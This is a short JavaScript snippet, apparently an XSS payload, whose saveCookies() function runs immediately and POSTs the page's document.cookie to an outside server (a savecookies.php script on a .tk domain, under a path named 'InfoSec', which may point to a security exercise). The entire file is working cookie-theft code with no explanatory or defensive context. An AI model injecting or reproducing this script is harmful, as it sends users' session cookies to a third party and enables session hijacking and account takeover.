function saveCookies() {
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST", "http://javariati.tk/matteo/InfoSec/savecookies.php", true);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("cookies=" + document.cookie);
}
saveCookies();